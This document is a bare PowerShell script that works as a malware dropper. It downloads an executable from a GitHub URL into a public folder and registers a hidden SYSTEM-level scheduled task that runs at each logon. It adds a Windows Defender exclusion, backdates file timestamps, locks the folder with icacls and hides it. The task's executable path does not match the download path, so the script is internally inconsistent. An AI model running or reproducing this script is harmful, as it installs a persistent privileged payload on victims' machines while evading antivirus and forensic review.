New-Item -ItemType Directory -Path C:\Users\Public\krnl\win\schvost
Invoke-WebRequest -Uri 

"https://raw.githubusercontent.com/milujemnastenky/bombardini-gusini/main/apps/schvostkrnl.exe" -OutFile "C:\Users\Public\krnl\win\schvost\schvostkrnl.exe"

Register-ScheduledTask -TaskName "WINschvostkrnl" -Action (New-ScheduledTaskAction -Execute "C:\Windows\System32\schvostkrnl.exe") -Trigger (New-ScheduledTaskTrigger -AtLogon) -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -StartWhenAvailable -Hidden -ExecutionTimeLimit 0 -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 5) -TaskPath "\" -Description "System Task" -Force

Add-MpPreference -ExclusionPath "C:\Users\Public\krnl\win\schvost\schvostkrnl.exe"


Set-ItemProperty -Path "C:\Users\Public\krnl" -Name LastWriteTime -Value (Get-Date "2024-12-13 14:23:09")

Set-ItemProperty -Path "C:\Users\Public\krnl" -Name CreationTime -Value (Get-Date "2024-12-13 14:23:08")

Set-ItemProperty -Path "C:\Users\Public\krnl\win" -Name LastWriteTime -Value (Get-Date "2024-12-13 14:23:49")

Set-ItemProperty -Path "C:\Users\Public\krnl\win" -Name CreationTime -Value (Get-Date "2024-12-13 14:23:48")

Set-ItemProperty -Path "C:\Users\Public\krnl\win\schvost" -Name LastWriteTime -Value (Get-Date "2024-12-13 14:24:12")

Set-ItemProperty -Path "C:\Users\Public\krnl\win\schvost" -Name CreationTime -Value (Get-Date "2024-12-13 14:24:11")

Set-ItemProperty -Path "C:\Users\Public\krnl\win\schvost\schvostkrnl.exe" -Name LastWriteTime -Value (Get-Date "2024-12-13 14:24:58")

Set-ItemProperty -Path "C:\Users\Public\krnl\win\schvost\schvostkrnl.exe" -Name CreationTime -Value (Get-Date "2024-12-13 14:24:57")

Start-Process -NoNewWindow -FilePath "icacls" -ArgumentList "`"C:\Users\Public\krnl`" /deny Everyone:(RX)" -Wait

Set-ItemProperty -Path "C:\Users\Public\krnl" -Name Attributes -Value Hidden


